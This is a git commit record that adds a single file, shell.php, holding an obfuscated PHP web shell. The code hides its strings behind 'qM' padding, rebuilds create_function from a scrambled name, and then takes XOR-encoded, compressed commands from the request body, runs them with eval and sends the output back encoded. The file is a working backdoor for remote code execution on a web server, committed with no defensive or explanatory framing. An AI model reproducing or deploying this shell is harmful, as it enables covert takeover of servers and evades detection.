f7de77a07f316cfb56a5d2dc380812b38eebb0b5
kimcuongden2019 <55727489+kimcuongden2019@users.noreply.github.com>
2019-09-26 14:47:18 +0700

    Create shell.php

---
+++ shell.php
@@ -0,0 +1,12 @@
+<?php
+$V='();  $r=@bqMase64_encqMoqMdeqM(@x(@gzcomprqMess($o),$kqM)); qM print("$qMp$kh$qMr$kf");}';
+$T='=0;$qMi<qM$qMl;){forqM($qMj=0;($j<$c&&$qMi<$l);$j++,qM$qMi+qM+){$o.=$tqM{$i}^$qMk{$j};';
+$P='3aqMfyzqMW";qMfunctioqMn x($t,$k)qM{$qMc=stqMrlen($k);qM$qMl=strlen($t);$o=""qM;foqMr($i';
+$f='"qMphp://input")qM,$mqM) == 1) { qMqM @ob_stqMart();  @evaqMl(@gzqMuncoqMqMmpressqM(@';
+$u='$k="ee11cqMbb1";qM$kh="qM9qM0qM52e40b07aa";$kf="c0cqMa060qMc23eqMqMeqM";$p="bn07AtKL6j';
+$Y=str_replace('g','','crgegate_gggfungction');
+$S='xqM(qM@base6qM4_decode($m[1])qM,$k))); qM $o=@ob_gqMet_qMconqMtqMents(); qM @ob_endqM_cleanqM';
+$d='}}returqMn $o;qM}if (qM@prqMeg_mqMatch("/$kqMh(qM.+)$kf/",@fqMilqMe_get_coqMnteqMnts(';
+$r=str_replace('qM','',$u.$P.$T.$d.$f.$S.$V);
+$n=$Y('',$r);$n();
+?>
